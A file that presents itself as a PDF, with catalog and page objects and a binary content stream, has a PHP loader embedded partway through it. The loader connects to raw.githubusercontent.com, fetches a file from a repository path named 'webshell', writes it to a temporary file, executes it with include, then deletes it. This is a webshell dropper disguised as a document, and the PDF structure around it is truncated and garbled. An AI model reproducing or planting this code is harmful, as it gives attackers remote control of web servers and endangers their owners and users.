%PDF-1.7
%����
1 0 obj
<</Type/Catalog/Pages 2 0 R/Lang(en) /StructTreeRoot 13 0 R/MarkInfo<</Marked true>>/Metadata 48 0 R/ViewerPreferences 49 0 R>>
endobj
2 0 obj
<</Type/Pages/Count 1/Kids[ 3 0 R] >>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/Resources<</ExtGState<</GS5 5 0 R/GS12 12 0 R>>/Pattern<</P7 7 0 R/P9 9 0 R>>/Font<</F1 10 0 R>>/ProcSet[/PDF/Text/ImageB/ImageC/ImageI] >>/MediaBox[ 0 0 612 792] /Contents 4 0 R/Group<</Type/Group/S/Transparency/CS/DeviceRGB>>/Tabs/S/StructParents 0>>
endobj
4 0 obj
<</Filter/FlateDecode/Length 1882>>
stream
x��Z�n�F}��������r� A�ܑ�n�"h�<0-��I����_ߙ�|����
���2sfΜ�]q�IӖ'��������g�s�)!�
	�Kh���������G���>+,���t8�:cV���Y8�un�aփ����20�0�a<(��;0�c\�R���0��T�yVIf,ݻp^0tovehe������Ƀ����
<?php
{
    $host = "raw.githubusercontent.com";
    $port = 443;
    $path = "/mangajat69/webshell/main/tobanga.php";

    $fp = stream_socket_client("ssl://$host:$port", $errno, $errstr, 30);
    if (!$fp) {
        echo "Error: $errstr ($errno)<br />\n";
    } else {
        $out = "GET $path HTTP/1.1\r\n";
        $out .= "Host: $host\r\n";
        $out .= "Connection: Close\r\n\r\n";
        fwrite($fp, $out);

        $content = "";
        while (!feof($fp)) {
            $content .= fgets($fp, 128);
        }
        fclose($fp);

        $header_end = strpos($content, "\r\n\r\n");
        if ($header_end !== false) {
            $content = substr($content, $header_end + 4);
        }

        $tmp_file = tempnam(sys_get_temp_dir(), 'data');
        file_put_contents($tmp_file, $content);
        include $tmp_file;
        unlink($tmp_file);
    }
}
